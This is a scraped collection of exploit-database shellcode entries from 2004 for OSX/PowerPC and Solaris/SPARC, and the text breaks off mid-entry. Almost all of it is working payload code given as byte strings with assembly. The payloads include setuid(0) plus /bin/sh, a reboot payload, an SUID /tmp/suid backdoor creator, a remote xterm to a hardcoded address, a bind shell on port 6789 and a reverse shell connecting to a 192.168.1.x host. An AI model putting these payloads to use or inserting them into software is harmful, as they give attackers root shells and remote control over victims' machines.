{"Title": "OSX/PPC - Reboot() Shellcode (28 bytes)", "Author": "B-r00t", "Published": ": 2004-09-26", "Platform": "OSX_PPC", "Download": "https://old.exploit-db.com/download/13483.c", "View": "https://old.exploit-db.com/raw/13483/", "code": ["/*", "PPC OSX/Darwin Shellcode by B-r00t. 2003.", "Does sync() reboot();", "See ASM below.", "28 Bytes.", "*/", "", "char shellcode[] =", "\"\\x7c\\x63\\x1a\\x79\"", "\"\\x39\\x40\\x01\\x70\"", "\"\\x38\\x0a\\xfe\\xb4\"", "\"\\x44\\xff\\xff\\x02\"", "\"\\x60\\x60\\x60\\x60\"", "\"\\x38\\x0a\\xfe\\xc7\"", "\"\\x44\\xff\\xff\\x02\";", "", "int main (void) ", "{", "        __asm__(\"b _shellcode\");", "}", "", "/*", "; PPC OS X / Darwin Shellcode by B-r00t.", "; sync() reboot().", "; Simply reboots the machine! - Just 4 Fun! ", ";", ".globl _main", ".text", "_main:", "        xor.    r3, r3, r3 ", "        li      r10, 368", "        addi    r0, r10, -332", "        .long   0x44ffff02", "        .long   0x60606060", "        addi    r0, r10, -313", "        .long   0x44ffff02", "*/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "OSX/PPC - setuid(0) + execve(/bin/sh) Shellcode (88 bytes)", "Author": "B-r00t", "Published": ": 2004-09-26", "Platform": "OSX_PPC", "Download": "https://old.exploit-db.com/download/13484.c", "View": "https://old.exploit-db.com/raw/13484/", "code": ["/*", "PPC OSX/Darwin Shellcode by B-r00t. 2003.", "Does setuid(0); execve(/bin/sh); exit(0);", "See ASM below.", "88 Bytes.", "*/", "char shellcode[] =", "\"\\x7c\\x63\\x1a\\x79\\x40\\x82\\xff\\xfd\"", "\"\\x7d\\x68\\x02\\xa6\\x3b\\xeb\\x01\\x70\"", "\"\\x39\\x40\\x01\\x70\\x39\\x1f\\xfe\\xdf\"", "\"\\x7c\\x68\\x19\\xae\\x38\\x0a\\xfe\\xa7\"", "\"\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\"", "\"\\x7c\\xa5\\x2a\\x79\\x38\\x7f\\xfe\\xd8\"", "\"\\x90\\x61\\xff\\xf8\\x90\\xa1\\xff\\xfc\"", "\"\\x38\\x81\\xff\\xf8\\x38\\x0a\\xfe\\xcb\"", "\"\\x44\\xff\\xff\\x02\\x7c\\xa3\\x2b\\x78\"", "\"\\x38\\x0a\\xfe\\x91\\x44\\xff\\xff\\x02\"", "\"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x58\";", "", "int main (void)", "{", "        __asm__(\"b _shellcode\");", "}", "", "", "/*", "; PPC OS X / Darwin Shellcode by B-r00t.", "; setuid(0) execve(/bin/sh) exit(0)", ";", ".globl _main", ".text", "_main:", "        xor.    r3, r3, r3", "        bnel    _main", "        mflr    r11", "        addi    r31, r11, 368", "        li      r10, 368", "        addi    r8, r31, -289", "        stbx    r3, r8, r3", "        addi    r0, r10, -345", "        .long   0x44ffff02", "        .long   0x60606060", "        xor.    r5, r5, r5", "        addi    r3, r31, -296", "        stw     r3, -8(r1)", "        stw     r5, -4(r1)", "        subi    r4, r1, 8", "        addi    r0, r10, -309", "        .long   0x44ffff02", "        mr      r3, r5", "        addi    r0, r10, -367", "        .long   0x44ffff02", "path:   .asciz  \"/bin/shX\"", "", "*/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "OSX/PPC - Create /tmp/suid Shellcode (122 bytes)", "Author": "B-r00t", "Published": ": 2004-09-26", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-126.php", "View": null, "code": ["/*", "PPC OSX/Darwin Shellcode by B-r00t. 2003.", "Does open(); write(); close(); exit();", "See ASM below.", "122 Bytes.", "*/", "", "char shellcode[] =", "\"\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\"", "\"\\x7f\\xe8\\x02\\xa6\\x39\\x1f\\x01\\x71\"", "\"\\x39\\x08\\xfe\\xf4\\x7c\\xa8\\x29\\xae\"", "\"\\x38\\x7f\\x01\\x68\\x38\\x63\\xfe\\xf4\"", "\"\\x38\\x80\\x02\\x01\\x38\\xa0\\xff\\xff\"", "\"\\x39\\x40\\x01\\x70\\x38\\x0a\\xfe\\x95\"", "\"\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\"", "\"\\x38\\x9f\\x01\\x72\\x38\\x84\\xfe\\xf4\"", "\"\\x38\\xaa\\xfe\\x9c\\x38\\x0a\\xfe\\x94\"", "\"\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\"", "\"\\x38\\x0a\\xfe\\x96\\x44\\xff\\xff\\x02\"", "\"\\x60\\x60\\x60\\x60\\x38\\x0a\\xfe\\x91\"", "\"\\x44\\xff\\xff\\x02\\x2f\\x74\\x6d\\x70\"", "\"\\x2f\\x73\\x75\\x69\\x64\\x58\\x23\\x21\"", "\"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a\"", "\"\\x73\\x68\";", "", "int main (void) ", "{", "        __asm__(\"b _shellcode\");", "}", "", "/*", "; PPC OS X / Darwin Shellcode by B-r00t. ", "; open(); write(); close(); exit()", "; Creates an SUID '/tmp/suid' to execute '/bin/sh'.", ";", ".globl _main", ".text", "_main:", "        xor.    r5, r5, r5", "        bnel    _main                    ", "        mflr    r31", "        addi    r8, r31, 268+92+9", "        addi    r8, r8, -268    ", "        stbx    r5, r8, r5", "        addi    r3, r31, 268+92", "        addi    r3, r3, -268", "        li      r4, 513", "        li      r5, -1  ", "        li      r10, 368", "        addi    r0, r10, -363", "        .long   0x44ffff02", "        .long   0x60606060", "        addi    r4, r31, 268+92+10", "        addi    r4, r4, -268", "        addi    r5, r10, -356", "        addi    r0, r10, -364", "        .long   0x44ffff02", "        .long   0x60606060", "        addi    r0, r10, -362", "        .long   0x44ffff02      ", "        .long   0x60606060", "        addi    r0, r10, -367", "        .long   0x44ffff02", "path:   .asciz  \"/tmp/suidX#!/bin/sh\\nsh\"", "", "*/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "OSX/PPC - Simple write() Shellcode (75 bytes)", "Author": "B-r00t", "Published": ": 2004-09-26", "Platform": "OSX_PPC", "Download": "https://old.exploit-db.com/download/13486.c", "View": "https://old.exploit-db.com/raw/13486/", "code": ["/*", "PPC OSX/Darwin Shellcode by B-r00t. 2003.", "Does write(); exit();", "See ASM below.", "75 Bytes.", "*/", "", "char shellcode[] =", "\"\\x7c\\x63\\x1a\\x79\\x40\\x82\\xff\\xfd\"", "\"\\x7f\\xe8\\x02\\xa6\\x39\\x40\\x01\\x70\"", "\"\\x38\\x6a\\xfe\\x91\\x38\\x9f\\x01\\x38\"", "\"\\x38\\x84\\xfe\\xf4\\x38\\xaa\\xfe\\xa7\"", "\"\\x38\\x0a\\xfe\\x94\\x44\\xff\\xff\\x02\"", "\"\\x60\\x60\\x60\\x60\\x38\\x0a\\xfe\\x91\"", "\"\\x44\\xff\\xff\\x02\\x0a\\x42\\x2d\\x72\"", "\"\\x30\\x30\\x74\\x20\\x52\\x30\\x78\\x20\"", "\"\\x59\\x33\\x52\\x20\\x57\\x30\\x72\\x31\"", "\"\\x64\\x21\\x0a\";", "", "int main (void) ", "{", "        __asm__(\"b _shellcode\");", "}", "", "/*", "; PPC OS X / Darwin Shellcode by B-r00t.", "; write() exit().", "; Simply writes 'B-r00t R0x Y3R W0r1d!", ";", ".globl _main", ".text", "_main:", "        xor.\tr3, r3, r3 ", "        bnel    _main                    ", "\tmflr  \tr31", "\tli\tr10, 368", "\taddi\tr3, r10, -367", "\taddi  \tr4, r31, 268+44", "\taddi  \tr4, r4, -268", "\taddi\tr5, r10, -345", "\taddi  \tr0, r10, -364", "        .long \t0x44ffff02", "\t.long\t0x60606060", "\taddi\tr0, r10, - 367", "\t.long \t0x44ffff02\t", "string: .asciz \"\\nB-r00t R0x Y3R W0r1d!\\n\"", "", "*/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "OSX/PPC - execve(/usr/X11R6/bin/xterm) Shellcode (141 bytes)", "Author": "B-r00t", "Published": ": 2004-09-26", "Platform": "OSX_PPC", "Download": "https://old.exploit-db.com/download/13487.c", "View": "https://old.exploit-db.com/raw/13487/", "code": ["/*", "PPC OSX/Darwin Shellcode by B-r00t. 2003.", "Does execve(/usr/X11R6/bin/xterm -display 192.168.0.10:0) exit(0);", "See ASM below.", "141 Bytes.", "*/", "", "char shellcode[] =", "\"\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\"", "\"\\x7f\\xe8\\x02\\xa6\\x39\\x5f\\x01\\x70\"", "\"\\x39\\x0a\\xfe\\xfc\\x7c\\xa8\\x29\\xae\"", "\"\\x39\\x0a\\xff\\x05\\x7c\\xa8\\x29\\xae\"", "\"\\x39\\x0a\\xff\\x14\\x7c\\xa8\\x29\\xae\"", "\"\\x38\\x6a\\xff\\x06\\x90\\x61\\xff\\xf8\"", "\"\\x38\\x6a\\xfe\\xfd\\x90\\x61\\xff\\xf4\"", "\"\\x38\\x6a\\xfe\\xe8\\x90\\x61\\xff\\xf0\"", "\"\\x90\\xa1\\xff\\xfc\\x38\\x81\\xff\\xf0\"", "\"\\x3b\\xc0\\x01\\x70\\x38\\x1e\\xfe\\xcb\"", "\"\\x44\\xff\\xff\\x02\\x7c\\xa3\\x2b\\x78\"", "\"\\x38\\x1e\\xfe\\x91\\x44\\xff\\xff\\x02\"", "\"\\x2f\\x75\\x73\\x72\\x2f\\x58\\x31\\x31\"", "\"\\x52\\x36\\x2f\\x62\\x69\\x6e\\x2f\\x78\"", "\"\\x74\\x65\\x72\\x6d\\x2a\\x2d\\x64\\x69\"", "\"\\x73\\x70\\x6c\\x61\\x79\\x2a\\x31\\x39\"", "\"\\x32\\x2e\\x31\\x36\\x38\\x2e\\x30\\x2e\"", "\"\\x31\\x30\\x3a\\x30\\x2a\";", "", "int main (void) ", "{", "        __asm__(\"b _shellcode\");", "}", "", "", "/*", "; PPC OS X / Darwin Shellcode by B-r00t.", "; execve(/usr/X11R6/bin/xterm -display 192.168.0.10:0) exit(0) ", ";", ".globl _main", ".text", "_main:", "        xor.    r5, r5, r5", "        bnel    _main                    ", "        mflr    r31                       ", "        addi\tr10, r31, 368", "\taddi    r8, r10, -260", "        stbx    r5, r8, r5      ", "\taddi    r8, r10, -251", "        stbx    r5, r8, r5", "\taddi    r8, r10, -236", "        stbx    r5, r8, r5", "\taddi    r3, r10, -250", "        stw     r3, -8(r1)", "\taddi    r3, r10, -259", "        stw     r3, -12(r1)", "\taddi    r3, r10, -280          ", "        stw     r3, -16(r1)      ", "        stw     r5, -4(r1)      ", "        subi    r4, r1, 16       ", "        li      r30, 368             ", "        addi    r0, r30, -309   ", "        .long   0x44ffff02      ", "        mr      r3, r5                  ", "        addi    r0, r30, -367   ", "        .long   0x44ffff02", "path:   .asciz  \"/usr/X11R6/bin/xterm*-display*192.168.0.10:0*\"", "", "*/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Solaris/SPARC - execve(/bin/sh) Shellcode (52 bytes)", "Author": "LSD-PLaNET", "Published": ": 2004-09-26", "Platform": "Solaris_SPARC", "Download": "http://shell-storm.org/shellcode/files/shellcode-116.php", "View": null, "code": ["//Solaris/Sparc - LSD", "char shellcode[]=", "    \"\\x20\\xbf\\xff\\xff\"     /* bn,a    <shellcode-4>        */", "    \"\\x20\\xbf\\xff\\xff\"     /* bn,a    <shellcode>          */", "    \"\\x7f\\xff\\xff\\xff\"     /* call    <shellcode+4>        */", "    \"\\x90\\x03\\xe0\\x20\"     /* add     %o7,32,%o0           */", "    \"\\x92\\x02\\x20\\x10\"     /* add     %o0,16,%o1           */", "    \"\\xc0\\x22\\x20\\x08\"     /* st      %g0,[%o0+8]          */", "    \"\\xd0\\x22\\x20\\x10\"     /* st      %o0,[%o0+16]         */", "    \"\\xc0\\x22\\x20\\x14\"     /* st      %g0,[%o0+20]         */", "    \"\\x82\\x10\\x20\\x0b\"     /* mov     0xb,%g1              */", "    \"\\x91\\xd0\\x20\\x08\"     /* ta      8                    */", "    \"/bin/ksh\"", ";", "", "char jump[]=", "    \"\\x81\\xc3\\xe0\\x08\"     /* jmp     %o7+8                */", "    \"\\x90\\x10\\x00\\x0e\"     /* mov     %sp,%o0              */", ";", "", "static char nop[]=\"\\x80\\x1c\\x40\\x11\";", "", "# milw0rm.com [2004-09-26]"]}
]

const pag_12  = [{"Title": "Solaris/SPARC - Bind (6789/TCP) Shell (/bin/sh) Shellcode (228 bytes)", "Author": "Claes M. Nyberg", "Published": ": 2004-09-26", "Platform": "Solaris_SPARC", "Download": "https://old.exploit-db.com/download/13495.c", "View": "https://old.exploit-db.com/raw/13495/", "code": ["/*", " * Solaris shellcode - connects /bin/sh to a port", " *", " * Claes M. Nyberg 20020624", " * <cmn@darklab.org>, <md0claes@mdstud.chalmers.se>", " */", "", "#include <string.h>", "", "/**********************************************************************", "void", "main(void)", "{", "", "__asm__(\"", "", "        ! Server address", "        xor    %l1, %l1, %l1    ! l1 = 0", "        st     %l1, [%sp - 12]  ! 0 <=> INADDR_ANY", "        mov    0x2, %l1         ! AF_INET", "        sth    %l1, [%sp -16]   ! Server family", "        mov    0x30, %l1        ! High order byte of Port", "        sll    %l1, 0x8, %l1    ! << ", "        or     0x39, %l1, %l1   ! Low order byte of port", "        sth    %l1, [%sp - 14]  ! Server port", "", "        ! Address length", "        mov    0x10, %l1        ! 16, sizeof(struct sockaddr_in);", "        st     %l1, [%sp -36]   ! Length of address", "", "        ! Create socket", "        mov    0x2, %o0         ! o0 = AF_INET", "        mov    0x2, %o1         ! o1 = SOCK_STREAM", "        xor    %o2, %o2, %o2    ! o2 = 0", "        mov    0xe6, %g1        ! g1 = 230 = SYS_so_socket", "        ta     8                ! socket(AF_INET, SOCK_STREAM, 0);", "        add    %o0, 0x1, %l0    ! l0 = server_fd +1", "", "        ! Bind address to socket", "        sub    %sp, 16, %o1     ! o1 = &server", "        mov    0x10, %o2        ! o2 = 16 = sizeof(struct sockaddr_in);", "        mov    232, %g1         ! g1 = 232 = SYS_bind", "        ta     8", "", "        ! Listen", "        sub    %l0, 0x1, %o0    ! o0 = server_fd", "        xor    %o1, %o1, %o1    ! backlog = 0", "        mov    233, %g1         ! g1 = 233 = SYS_listen", "        ta     8", "", "        ! Accept", "        sub    %l0, 0x1, %o0    ! o0 = server_fd", "        sub    %sp, 32, %o1     ! o1 = &client", "        sub    %sp, 36, %o2     ! o2 = &addrlen", "        mov    234, %g1         ! g1 = 234 = SYS_accept", "        ta     8", "        add    %o0, 0x1, %l0    ! l0 = client_fd", "        ", "        ! Set up IO              ", "        sub    %l0, 0x1, %o0    ! o0 = client_fd", "        mov    0x9, %o1         ! o1 = F_DUP2FD", "        xor    %o2, %o2, %o2    ! o2 = 0 = STDIN_FILENO", "        mov    0x3e, %g1        ! g1 = 62 = SYS_fcntl", "        ta     8                ! fcntl(client_fd, F_DUP2FD, STDIN_FILENO);", "        sub    %l0, 0x1, %o0    ! o0 = client_fd", "        mov    0x1, %o2         ! o2 = 1 = STDOUT_FILENO", "        ta     8                ! fcntl(client_fd, F_DUP2FD, STDOUT_FILENO);", "        sub    %l0, 0x1, %o0    ! o0 = client_fd", "        mov    0x2, %o2         ! o2 = 1 = STDERR_FILENO", "        ta     8                ! fcntl(client_fd, F_DUP2FD, STDERR_FILENO);", "        ", "        ! Execve /bin/sh", "        xor    %o2, %o2, %o2    ! o2 = 0 => envp = NULL", "        set    0x2f62696e, %l0  ! lo = '/bin'", "        set    0x2f2f7368, %l1  ! l1 = '//sh'    ", "        st     %o2, [%sp - 4]   ! String ends with NULL ", "        st     %l1, [%sp - 8]   ! Write //sh to stack", "        st     %l0, [%sp - 12]  ! Write /bin to stack", "        sub    %sp, 12, %o0     ! o0 = &string", "        st     %o2, [%sp - 16]  ! argv[1] = NULL", "        st     %o0, [%sp - 20]  ! argv[0] = &string", "        sub    %sp, 20, %o1     ! o1 = &string", "        mov    0x3b, %g1        ! g1 = 59 = SYS_execve", "        ta     8                ! execve(argv[0], argv, NULL);", "", "        ! Exit ", "        mov    1, %g1           ! g1 = 1 = SYS_exit", "        ta     8                ! exit();", "    \");", "}", "", "**********************************************************************/", "", "/* Index of low order byte for port */", "#define P0    27", "#define P1    19", "", "", "static char solaris_code[] =", "", "            /* Server address */", "    \"\\xa2\\x1c\\x40\\x11\"   /* xor     %l1, %l1, %l1        */", "    \"\\xe2\\x23\\xbf\\xf4\"   /* st      %l1, [%sp - 12]      */", "    \"\\xa2\\x10\\x20\\x02\"   /* mov     2, %l1               */", "    \"\\xe2\\x33\\xbf\\xf0\"   /* sth     %l1, [%sp - 16]      */", "    \"\\xa2\\x10\\x20\\x30\"   /* mov     48, %l1              */", "    \"\\xa3\\x2c\\x60\\x08\"   /* sll     %l1, 8, %l1          */", "    \"\\xa2\\x14\\x60\\x39\"   /* or      %l1, 57, %l1         */", "    \"\\xe2\\x33\\xbf\\xf2\"   /* sth     %l1, [%sp - 14]      */", "", "            /* Address length */", "    \"\\xa2\\x10\\x20\\x10\"   /* mov     16, %l1              */", "    \"\\xe2\\x23\\xbf\\xdc\"   /* st      %l1, [%sp - 36]      */", "", "            /* Create socket */", "    \"\\x90\\x10\\x20\\x02\"   /* mov     2, %o0               */", "    \"\\x92\\x10\\x20\\x02\"   /* mov     2, %o1               */", "    \"\\x94\\x1a\\x80\\x0a\"   /* xor     %o2, %o2, %o2        */", "    \"\\x82\\x10\\x20\\xe6\"   /* mov     230, %g1             */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "    \"\\xa0\\x02\\x20\\x01\"   /* add     %o0, 1, %l0          */", "", "            /* Bind address to socket */", "    \"\\x92\\x23\\xa0\\x10\"   /* sub     %sp, 16, %o1         */", "    \"\\x94\\x10\\x20\\x10\"   /* mov     16, %o2              */", "    \"\\x82\\x10\\x20\\xe8\"   /* mov     232, %g1             */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "", "            /* Listen */", "    \"\\x90\\x24\\x20\\x01\"   /* sub     %l0, 1, %o0          */", "    \"\\x92\\x1a\\x40\\x09\"   /* xor     %o1, %o1, %o1        */", "    \"\\x82\\x10\\x20\\xe9\"   /* mov     233, %g1             */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "    ", "            /* Accept */", "    \"\\x90\\x24\\x20\\x01\"   /* sub     %l0, 1, %o0          */", "    \"\\x92\\x23\\xa0\\x20\"   /* sub     %sp, 32, %o1         */", "    \"\\x94\\x23\\xa0\\x24\"   /* sub     %sp, 36, %o2         */", "    \"\\x82\\x10\\x20\\xea\"   /* mov     234, %g1             */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "    \"\\xa0\\x02\\x20\\x01\"   /* add     %o0, 1, %l0          */", "    ", "            /* Set up IO */", "    \"\\x90\\x24\\x20\\x01\"   /* sub     %l0, 1, %o0          */", "    \"\\x92\\x10\\x20\\x09\"   /* mov     9, %o1               */", "    \"\\x94\\x1a\\x80\\x0a\"   /* xor     %o2, %o2, %o2        */", "    \"\\x82\\x10\\x20\\x3e\"   /* mov     62, %g1              */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "    \"\\x90\\x24\\x20\\x01\"   /* sub     %l0, 1, %o0          */", "    \"\\x94\\x10\\x20\\x01\"   /* mov     1, %o2               */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "    \"\\x90\\x24\\x20\\x01\"   /* sub     %l0, 1, %o0          */", "    \"\\x94\\x10\\x20\\x02\"   /* mov     2, %o2               */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "", "            /* Execve /bin/sh */", "    \"\\x94\\x1a\\x80\\x0a\"   /* xor     %o2, %o2, %o2        */", "    \"\\x21\\x0b\\xd8\\x9a\"   /* sethi   %hi(0x2f626800), %l0 */", "    \"\\xa0\\x14\\x21\\x6e\"   /* or      %l0, 0x16e, %l0      */", "    \"\\x23\\x0b\\xcb\\xdc\"   /* sethi   %hi(0x2f2f7000), %l1 */", "    \"\\xa2\\x14\\x63\\x68\"   /* or      %l1, 0x368, %l1      */", "    \"\\xd4\\x23\\xbf\\xfc\"   /* st      %o2, [%sp - 4]       */", "    \"\\xe2\\x23\\xbf\\xf8\"   /* st      %l1, [%sp - 8]       */", "    \"\\xe0\\x23\\xbf\\xf4\"   /* st      %l0, [%sp - 12]      */", "    \"\\x90\\x23\\xa0\\x0c\"   /* sub     %sp, 12, %o0         */", "    \"\\xd4\\x23\\xbf\\xf0\"   /* st      %o2, [%sp - 16]      */", "    \"\\xd0\\x23\\xbf\\xec\"   /* st      %o0, [%sp - 20]      */", "    \"\\x92\\x23\\xa0\\x14\"   /* sub     %sp, 20, %o1         */", "    \"\\x82\\x10\\x20\\x3b\"   /* mov     59, %g1              */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "", "            /* Exit */", "    \"\\x82\\x10\\x20\\x01\"   /* mov     1, %g1               */", "    \"\\x91\\xd0\\x20\\x08\";  /* ta      0x8                  */", "", "static char _solaris_code[] =", "    \"\\xa2\\x1c\\x40\\x11\\xe2\\x23\\xbf\\xf4\\xa2\\x10\\x20\\x02\\xe2\\x33\\xbf\\xf0\"", "    \"\\xa2\\x10\\x20\\x30\\xa3\\x2c\\x60\\x08\\xa2\\x14\\x60\\x39\\xe2\\x33\\xbf\\xf2\"", "    \"\\xa2\\x10\\x20\\x10\\xe2\\x23\\xbf\\xdc\\x90\\x10\\x20\\x02\\x92\\x10\\x20\\x02\"", "    \"\\x94\\x1a\\x80\\x0a\\x82\\x10\\x20\\xe6\\x91\\xd0\\x20\\x08\\xa0\\x02\\x20\\x01\"", "    \"\\x92\\x23\\xa0\\x10\\x94\\x10\\x20\\x10\\x82\\x10\\x20\\xe8\\x91\\xd0\\x20\\x08\"", "    \"\\x90\\x24\\x20\\x01\\x92\\x1a\\x40\\x09\\x82\\x10\\x20\\xe9\\x91\\xd0\\x20\\x08\"", "    \"\\x90\\x24\\x20\\x01\\x92\\x23\\xa0\\x20\\x94\\x23\\xa0\\x24\\x82\\x10\\x20\\xea\"", "    \"\\x91\\xd0\\x20\\x08\\xa0\\x02\\x20\\x01\\x90\\x24\\x20\\x01\\x92\\x10\\x20\\x09\"", "    \"\\x94\\x1a\\x80\\x0a\\x82\\x10\\x20\\x3e\\x91\\xd0\\x20\\x08\\x90\\x24\\x20\\x01\"", "    \"\\x94\\x10\\x20\\x01\\x91\\xd0\\x20\\x08\\x90\\x24\\x20\\x01\\x94\\x10\\x20\\x02\"", "    \"\\x91\\xd0\\x20\\x08\\x94\\x1a\\x80\\x0a\\x21\\x0b\\xd8\\x9a\\xa0\\x14\\x21\\x6e\"", "    \"\\x23\\x0b\\xcb\\xdc\\xa2\\x14\\x63\\x68\\xd4\\x23\\xbf\\xfc\\xe2\\x23\\xbf\\xf8\"", "    \"\\xe0\\x23\\xbf\\xf4\\x90\\x23\\xa0\\x0c\\xd4\\x23\\xbf\\xf0\\xd0\\x23\\xbf\\xec\"", "    \"\\x92\\x23\\xa0\\x14\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x08\\x82\\x10\\x20\\x01\"", "    \"\\x91\\xd0\\x20\\x08\";", "", "int", "main(void)", "{", "    void (*code)() = (void *)_solaris_code;", "    ", "    _solaris_code[P0] = 0x85;", "    _solaris_code[P1] = 0x1a;", "", "    printf(\"Shellcode length: %d\\n\", strlen(_solaris_code));", "    ", "    /* Shell on port 6789 */", "    code();", "    return(1);", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Solaris/SPARC - Reverse (192.168.1.4:5678/TCP) Shell (/bin/sh) Shellcode (204 bytes)", "Author": "Claes M. Nyberg", "Published": ": 2004-09-26", "Platform": "Solaris_SPARC", "Download": "https://old.exploit-db.com/download/13496.c", "View": "https://old.exploit-db.com/raw/13496/", "code": ["/*", " * Solaris shellcode - connects /bin/sh to a host", " *", " * Claes M. Nyberg 20020624", " * <cmn@darklab.org>, <md0claes@mdstud.chalmers.se>", " */", "", "#include <string.h>", "", "/***********************************************************", "void", "main(void)", "{", "", "__asm__(\"", "       ", "        ! Create socket", "        mov    0x2, %o0         ! o0 = AF_INET", "        mov    0x2, %o1         ! o1 = SOCK_STREAM", "        xor    %o2, %o2, %o2    ! o2 = 0", "        mov    0xe6, %g1        ! g1 = 230 = SYS_so_socket", "        ta     8                ! socket(AF_INET, SOCK_STREAM, 0);", "        add    %o0, 0x1, %l0    ! l0 = socket_fd +1 ", "", "        ! Server address", "        mov    0xc0, %l1        ! 192", "        sll    %l1, 0x8, %l1    ! 192.0", "        or     0xa8, %l1, %l1   ! 192.168", "        sll    %l1, 0x8, %l1    ! 192.168.0", "        or     0x1, %l1, %l1    ! 192.168.1", "        sll    %l1, 0x8, %l1    ! 192.168.1.0", "        or     0x1, %l1, %l1    ! 192.168.1.1", "        st     %l1, [%sp - 12]  ! Server IP ", "        mov    0x2, %l1         ! AF_INET", "        sth    %l1, [%sp -16]   ! Server family", "        mov    0x30, %l1        ! High order byte of Port", "        sll    %l1, 0x8, %l1    ! << ", "        or     0x39, %l1, %l1   ! Low order byte of port", "        sth    %l1, [%sp - 14]  ! Server port", "", "        ! Connect", "        sub    %sp, 16, %o1     ! o1 = &server", "        mov    0x10, %o2        ! o2 = 16 = sizeof(struct sockaddr_in)", "        mov    0xeb, %g1        ! g1 = 235 = SYS_connect", "        ta     8                ! connect(socket_fd, &server, 16);", "", "        ! Set up IO              ", "        sub    %l0, 0x1, %o0    ! o0 = socket_fd", "        mov    0x9, %o1         ! o1 = F_DUP2FD", "        xor    %o2, %o2, %o2    ! o2 = 0 = STDIN_FILENO", "        mov    0x3e, %g1        ! g1 = 62 = SYS_fcntl", "        ta     8                ! fcntl(socket_fd, F_DUP2FD, STDIN_FILENO);", "        sub    %l0, 0x1, %o0    ! o0 = socket_fd", "        mov    0x1, %o2         ! o2 = 1 = STDOUT_FILENO", "        ta     8                ! fcntl(socket_fd, F_DUP2FD, STDOUT_FILENO);", "        sub    %l0, 0x1, %o0    ! o0 = socket_fd", "        mov    0x2, %o2         ! o2 = 1 = STDERR_FILENO", "        ta     8                ! fcntl(socket_fd, F_DUP2FD, STDERR_FILENO);", "        ", "        ! Execve /bin/sh", "        xor    %o2, %o2, %o2    ! o2 = 0 => envp = NULL", "        set    0x2f62696e, %l0  ! lo = '/bin'", "        set    0x2f2f7368, %l1  ! l1 = '//sh'    ", "        st     %o2, [%sp - 4]   ! String ends with NULL ", "        st     %l1, [%sp - 8]   ! Write //sh to stack", "        st     %l0, [%sp - 12]  ! Write /bin to stack", "        sub    %sp, 12, %o0     ! o0 = &string", "        st     %o2, [%sp - 16]  ! argv[1] = NULL", "        st     %o0, [%sp - 20]  ! argv[0] = &string", "        sub    %sp, 20, %o1     ! o1 = &string", "        mov    0x3b, %g1        ! g1 = 59 = SYS_execve", "        ta     8                ! execve(argv[0], argv, NULL);", "", "        ! Exit ", "        mov    1, %g1           ! g1 = 1 = SYS_exit", "        ta     8                ! exit();", "    \");", "}", "***********************************************************/", "", "/* Index of low order byte in IP address */", "#define IP0       51    ", "#define IP1       43", "#define IP2       35", "#define IP3       27", "", "/* Index of low order byte in port */", "#define P0        75    ", "#define P1        67  ", "", "static char solaris_code[] =", "    ", "    /* Create socket */", "    \"\\x90\\x10\\x20\\x02\"   /* mov     2, %o0               */", "    \"\\x92\\x10\\x20\\x02\"   /* mov     2, %o1               */", "    \"\\x94\\x1a\\x80\\x0a\"   /* xor     %o2, %o2, %o2        */", "    \"\\x82\\x10\\x20\\xe6\"   /* mov     230, %g1             */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "    \"\\xa0\\x02\\x20\\x01\"   /* add     %o0, 1, %l0          */", "", "    /* Server address */", "    \"\\xa2\\x10\\x20\\xc0\"   /* mov     192, %l1             */", "    \"\\xa3\\x2c\\x60\\x08\"   /* sll     %l1, 8, %l1          */", "    \"\\xa2\\x14\\x60\\xa8\"   /* or      %l1, 168, %l1        */", "    \"\\xa3\\x2c\\x60\\x08\"   /* sll     %l1, 8, %l1          */", "    \"\\xa2\\x14\\x60\\x01\"   /* or      %l1, 1, %l1          */", "    \"\\xa3\\x2c\\x60\\x08\"   /* sll     %l1, 8, %l1          */", "    \"\\xa2\\x14\\x60\\x01\"   /* or      %l1, 1, %l1          */", "    \"\\xe2\\x23\\xbf\\xf4\"   /* st      %l1, [%sp - 12]      */", "    \"\\xa2\\x10\\x20\\x02\"   /* mov     2, %l1               */", "    \"\\xe2\\x33\\xbf\\xf0\"   /* sth     %l1, [%sp - 16]      */", "    \"\\xa2\\x10\\x20\\x30\"   /* mov     48, %l1              */", "    \"\\xa3\\x2c\\x60\\x08\"   /* sll     %l1, 8, %l1          */", "    \"\\xa2\\x14\\x60\\x39\"   /* or      %l1, 57, %l1         */", "    \"\\xe2\\x33\\xbf\\xf2\"   /* sth     %l1, [%sp - 14]      */", "", "    /* Connect */", "    \"\\x92\\x23\\xa0\\x10\"   /* sub     %sp, 16, %o1         */", "    \"\\x94\\x10\\x20\\x10\"   /* mov     16, %o2              */", "    \"\\x82\\x10\\x20\\xeb\"   /* mov     235, %g1             */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "", "    /* Set up IO */", "    \"\\x90\\x24\\x20\\x01\"   /* sub     %l0, 1, %o0          */", "    \"\\x92\\x10\\x20\\x09\"   /* mov     9, %o1               */", "    \"\\x94\\x1a\\x80\\x0a\"   /* xor     %o2, %o2, %o2        */", "    \"\\x82\\x10\\x20\\x3e\"   /* mov     62, %g1              */", "    